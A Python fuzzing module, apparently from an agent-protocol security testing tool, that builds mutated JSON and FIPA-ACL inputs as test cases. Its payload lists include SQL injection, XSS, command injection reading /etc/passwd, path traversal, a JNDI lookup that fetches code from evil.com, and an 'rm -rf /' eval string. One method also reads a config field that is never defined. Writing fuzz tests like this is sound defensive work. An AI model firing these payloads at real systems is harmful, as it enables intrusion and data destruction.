"""
Security Fuzzing Module
Advanced fuzzing capabilities for TSAF security testing.
"""

import json
import random
import string
import struct
from typing import Dict, List, Any, Iterator, Optional
from dataclasses import dataclass
from enum import Enum

import structlog

from tsaf.analyzer.models import ProtocolType

logger = structlog.get_logger(__name__)


class FuzzingStrategy(str, Enum):
    """Fuzzing strategies."""
    RANDOM = "random"
    MUTATION = "mutation"
    GENERATION = "generation"
    BOUNDARY = "boundary"
    FORMAT_SPECIFIC = "format_specific"


@dataclass
class FuzzConfig:
    """Fuzzing configuration."""
    strategy: FuzzingStrategy
    iterations: int = 1000
    max_size: int = 10240  # 10KB
    mutation_rate: float = 0.1
    seed: Optional[int] = None


class BaseFuzzer:
    """Base class for protocol fuzzers."""

    def __init__(self, config: FuzzConfig):
        self.config = config
        if config.seed:
            random.seed(config.seed)

    def fuzz(self, base_input: str) -> Iterator[str]:
        """Generate fuzzed inputs."""
        for _ in range(self.config.max_iterations):
            # Choose fuzzing strategy
            strategy = random.choice(['mutate', 'inject', 'boundary', 'format'])

            if strategy == 'mutate':
                yield self._mutate_string(base_input, self.config.mutation_rate)
            elif strategy == 'inject':
                yield self._inject_special_chars(base_input)
            elif strategy == 'boundary':
                boundary_val = random.choice(self._boundary_values())
                yield str(boundary_val)
            elif strategy == 'format':
                yield self._generate_format_strings(base_input)

    def _random_string(self, length: int) -> str:
        """Generate random string."""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def _random_bytes(self, length: int) -> bytes:
        """Generate random bytes."""
        return bytes(random.getrandbits(8) for _ in range(length))

    def _mutate_string(self, data: str, rate: float = 0.1) -> str:
        """Mutate string with given rate."""
        chars = list(data)
        for i in range(len(chars)):
            if random.random() < rate:
                chars[i] = random.choice(string.printable)
        return ''.join(chars)

    def _inject_special_chars(self, data: str) -> str:
        """Inject special characters."""
        special_chars = ['\x00', '\xff', '\x7f', '\x80', '\uffff', '\\', '\'', '"', '%', '\n', '\r']
        position = random.randint(0, len(data))
        char = random.choice(special_chars)
        return data[:position] + char + data[position:]

    def _boundary_values(self) -> List[Any]:
        """Generate boundary values for different data types."""
        return [
            # Integer boundaries
            0, 1, -1, 2147483647, -2147483648, 4294967295,
            # String boundaries
            "", "A", "A" * 1000, "A" * 10000,
            # Unicode
            "🤖", "测试", "тест",
            # Special characters
            "\x00", "\xff", "\n\r\t",
            # SQL injection patterns
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            # XSS patterns
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            # Command injection
            "; cat /etc/passwd",
            "| whoami",
            # Path traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam"
        ]

    def _generate_format_strings(self, base_input: str) -> str:
        """Generate format string attack vectors."""
        format_strings = [
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n%n%n",
            "%.1000d%.1000d%.1000d",
            "%08x.%08x.%08x.%08x",
            "{0}{1}{2}{3}{4}{5}",
            "${jndi:ldap://evil.com/x}",
            "{{7*7}}",
            "#{7*7}",
            "${{7*7}}"
        ]
        format_str = random.choice(format_strings)
        position = random.randint(0, len(base_input))
        return base_input[:position] + format_str + base_input[position:]


class JSONFuzzer(BaseFuzzer):
    """JSON-specific fuzzer for MCP and other JSON-based protocols."""

    def fuzz(self, base_input: str) -> Iterator[str]:
        """Generate fuzzed JSON inputs."""
        try:
            base_data = json.loads(base_input)
        except json.JSONDecodeError:
            # If base input is not valid JSON, generate random JSON
            base_data = {"test": "data"}

        for i in range(self.config.iterations):
            if self.config.strategy == FuzzingStrategy.MUTATION:
                yield self._mutate_json(base_data)
            elif self.config.strategy == FuzzingStrategy.GENERATION:
                yield self._generate_json()
            elif self.config.strategy == FuzzingStrategy.BOUNDARY:
                yield self._boundary_json(base_data)
            else:  # RANDOM
                yield self._random_json()

    def _mutate_json(self, data: Dict[str, Any]) -> str:
        """Mutate JSON data."""
        mutated = data.copy()

        # Random mutations
        mutations = [
            self._add_random_field,
            self._modify_existing_field,
            self._change_data_types,
            self._inject_special_values,
            self._create_deep_nesting,
            self._duplicate_keys,
            self._inject_malformed_json
        ]

        mutation = random.choice(mutations)
        try:
            mutated = mutation(mutated)
            return json.dumps(mutated)
        except:
            # If mutation fails, return malformed JSON
            return self._inject_malformed_json(mutated)

    def _add_random_field(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Add random field to JSON."""
        key = self._random_string(random.randint(1, 20))
        value = random.choice([
            self._random_string(random.randint(1, 100)),
            random.randint(-1000000, 1000000),
            random.choice([True, False, None]),
            [self._random_string(5) for _ in range(random.randint(1, 10))]
        ])
        data[key] = value
        return data

    def _modify_existing_field(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Modify existing field."""
        if not data:
            return data

        key = random.choice(list(data.keys()))
        original_value = data[key]

        # Mutate based on type
        if isinstance(original_value, str):
            data[key] = self._mutate_string(original_value, self.config.mutation_rate)
        elif isinstance(original_value, int):
            data[key] = original_value + random.randint(-1000, 1000)
        elif isinstance(original_value, bool):
            data[key] = not original_value
        elif isinstance(original_value, list):
            if original_value:
                original_value[random.randint(0, len(original_value)-1)] = self._random_string(10)
                data[key] = original_value

        return data

    def _change_data_types(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Change data types of fields."""
        if not data:
            return data

        key = random.choice(list(data.keys()))
        new_values = [
            "string_value",
            12345,
            True,
            None,
            [],
            {},
            3.14159
        ]
        data[key] = random.choice(new_values)
        return data

    def _inject_special_values(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Inject special/boundary values."""
        boundary_values = self._boundary_values()
        key = random.choice(list(data.keys())) if data else "test_key"
        data[key] = random.choice(boundary_values)
        return data

    def _create_deep_nesting(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Create deeply nested structures."""
        depth = random.randint(10, 100)
        nested = data
        for i in range(depth):
            nested[f"level_{i}"] = {}
            nested = nested[f"level_{i}"]
        nested["deep_value"] = "reached_bottom"
        return data

    def _duplicate_keys(self, data: Dict[str, Any]) -> str:
        """Create JSON with duplicate keys (invalid JSON)."""
        json_str = json.dumps(data)
        if data:
            key = list(data.keys())[0]
            # Insert duplicate key
            insert_pos = json_str.find(f'"{key}"') + len(f'"{key}"')
            duplicate = f', "{key}": "duplicate_value"'
            json_str = json_str[:insert_pos] + duplicate + json_str[insert_pos:]
        return json_str

    def _inject_malformed_json(self, data: Dict[str, Any]) -> str:
        """Create malformed JSON."""
        malformed_patterns = [
            lambda s: s[:-1],  # Remove last character
            lambda s: s + ",",  # Add extra comma
            lambda s: s.replace('"', "'"),  # Replace quotes
            lambda s: s.replace(':', '='),  # Replace colons
            lambda s: s + '{"unclosed": ',  # Unclosed object
            lambda s: s.replace('{', '[').replace('}', ']'),  # Wrong brackets
        ]

        json_str = json.dumps(data)
        pattern = random.choice(malformed_patterns)
        return pattern(json_str)

    def _generate_json(self) -> str:
        """Generate random JSON."""
        return json.dumps(self._random_json_object())

    def _random_json(self) -> str:
        """Generate completely random JSON-like string."""
        random_chars = ''.join(random.choices(
            string.ascii_letters + string.digits + '{}[]":,\\/',
            k=random.randint(10, 1000)
        ))
        return random_chars

    def _boundary_json(self, base_data: Dict[str, Any]) -> str:
        """Generate JSON with boundary values."""
        boundary_data = base_data.copy()
        for key in boundary_data:
            if random.random() < 0.3:  # 30% chance to replace with boundary value
                boundary_data[key] = random.choice(self._boundary_values())
        return json.dumps(boundary_data)

    def _random_json_object(self, depth: int = 0, max_depth: int = 5) -> Any:
        """Generate random JSON object."""
        if depth >= max_depth:
            return random.choice(self._boundary_values()[:10])  # Simple values only

        obj_type = random.choice(['dict', 'list', 'value'])

        if obj_type == 'dict':
            size = random.randint(0, 5)
            return {
                self._random_string(random.randint(1, 10)): self._random_json_object(depth + 1, max_depth)
                for _ in range(size)
            }
        elif obj_type == 'list':
            size = random.randint(0, 5)
            return [self._random_json_object(depth + 1, max_depth) for _ in range(size)]
        else:
            return random.choice(self._boundary_values())


class FIPAACLFuzzer(BaseFuzzer):
    """FIPA-ACL specific fuzzer."""

    def fuzz(self, base_input: str) -> Iterator[str]:
        """Generate fuzzed FIPA-ACL inputs."""
        for i in range(self.config.iterations):
            if self.config.strategy == FuzzingStrategy.MUTATION:
                yield self._mutate_fipa_acl(base_input)
            elif self.config.strategy == FuzzingStrategy.GENERATION:
                yield self._generate_fipa_acl()
            else:
                yield self._random_fipa_acl()

    def _mutate_fipa_acl(self, data: str) -> str:
        """Mutate FIPA-ACL message."""
        mutations = [
            self._inject_malformed_sexp,
            self._modify_performative,
            self._inject_invalid_parameters,
            self._create_deeply_nested_sexp,
            self._inject_binary_data
        ]

        mutation = random.choice(mutations)
        return mutation(data)

    def _inject_malformed_sexp(self, data: str) -> str:
        """Inject malformed S-expressions."""
        malformed_patterns = [
            lambda s: s.replace('(', '['),
            lambda s: s.replace(')', '}'),
            lambda s: s + '(unclosed',
            lambda s: ')' + s + '(',
            lambda s: s.replace(' ', '\x00'),
        ]

        pattern = random.choice(malformed_patterns)
        return pattern(data)

    def _modify_performative(self, data: str) -> str:
        """Modify FIPA-ACL performative."""
        dangerous_performatives = [
            'execute-system-command',
            'delete-all-data',
            'shutdown-agent',
            'escalate-privileges'
        ]

        # Try to replace existing performative
        if '(' in data:
            parts = data.split(' ', 2)
            if len(parts) >= 2:
                parts[1] = random.choice(dangerous_performatives)
                return ' '.join(parts)

        return f"({random.choice(dangerous_performatives)} {data[1:-1]})" if data.startswith('(') else data

    def _inject_invalid_parameters(self, data: str) -> str:
        """Inject invalid parameters."""
        invalid_params = [
            ':sender \x00malicious-agent',
            ':content (eval (system "rm -rf /"))',
            ':ontology ../../../etc/passwd',
            ':language <script>alert("xss")</script>',
            f':content {"A" * 10000}',  # Large content
        ]

        param = random.choice(invalid_params)
        insert_pos = random.randint(0, len(data))
        return data[:insert_pos] + ' ' + param + data[insert_pos:]

    def _create_deeply_nested_sexp(self, data: str) -> str:
        """Create deeply nested S-expressions."""
        depth = random.randint(50, 200)
        nested = '(' * depth + 'deeply-nested-content' + ')' * depth
        return f"(inform :content {nested})"

    def _inject_binary_data(self, data: str) -> str:
        """Inject binary data."""
        binary_data = self._random_bytes(random.randint(10, 100))
        try:
            binary_str = binary_data.decode('utf-8', errors='ignore')
        except:
            binary_str = str(binary_data)

        insert_pos = random.randint(0, len(data))
        return data[:insert_pos] + binary_str + data[insert_pos:]

    def _generate_fipa_acl(self) -> str:
        """Generate random FIPA-ACL message."""
        performatives = ['inform', 'request', 'query-if', 'propose', 'accept-proposal', 'reject-proposal']
        performative = random.choice(performatives)

        parameters = []
        param_types = [':sender', ':receiver', ':content', ':language', ':ontology', ':protocol']

        for param in random.sample(param_types, random.randint(2, 5)):
            value = self._random_string(random.randint(5, 20))
            parameters.append(f'{param} {value}')

        return f"({performative} {' '.join(parameters)})"

    def _random_fipa_acl(self) -> str:
        """Generate random FIPA-ACL-like string."""
        chars = '()abcdefghijklmnopqrstuvwxyz:- '
        return ''.join(random.choices(chars, k=random.randint(50, 500)))


class ProtocolFuzzer:
    """Multi-protocol fuzzer coordinator."""

    def __init__(self):
        self.fuzzers = {
            ProtocolType.MCP: JSONFuzzer,
            ProtocolType.A2A: JSONFuzzer,
            ProtocolType.ACP: JSONFuzzer,
            ProtocolType.FIPA_ACL: FIPAACLFuzzer
        }

    def fuzz_protocol(
        self,
        protocol: ProtocolType,
        base_input: str,
        config: FuzzConfig
    ) -> Iterator[str]:
        """Fuzz input for specific protocol."""
        fuzzer_class = self.fuzzers.get(protocol, BaseFuzzer)
        fuzzer = fuzzer_class(config)

        logger.info(
            "Starting protocol fuzzing",
            protocol=protocol.value,
            strategy=config.strategy.value,
            iterations=config.iterations
        )

        yield from fuzzer.fuzz(base_input)

    def generate_test_cases(
        self,
        protocol: ProtocolType,
        base_inputs: List[str],
        config: FuzzConfig
    ) -> List[Dict[str, Any]]:
        """Generate fuzzing test cases."""
        test_cases = []

        for i, base_input in enumerate(base_inputs):
            fuzzed_inputs = list(self.fuzz_protocol(protocol, base_input, config))

            for j, fuzzed_input in enumerate(fuzzed_inputs[:100]):  # Limit to 100 per base
                test_case = {
                    "id": f"fuzz_{protocol.value}_{i}_{j}",
                    "name": f"Fuzzed {protocol.value} input {i}-{j}",
                    "description": f"Fuzzing test case for {protocol.value} protocol",
                    "category": "protocol_fuzzing",
                    "severity": "medium",
                    "protocol": protocol.value,
                    "payload": fuzzed_input,
                    "base_input": base_input,
                    "fuzzing_strategy": config.strategy.value,
                    "metadata": {
                        "generated": True,
                        "fuzzing_iteration": j,
                        "base_index": i
                    }
                }
                test_cases.append(test_case)

        logger.info(
            "Generated fuzzing test cases",
            protocol=protocol.value,
            total_cases=len(test_cases)
        )

        return test_cases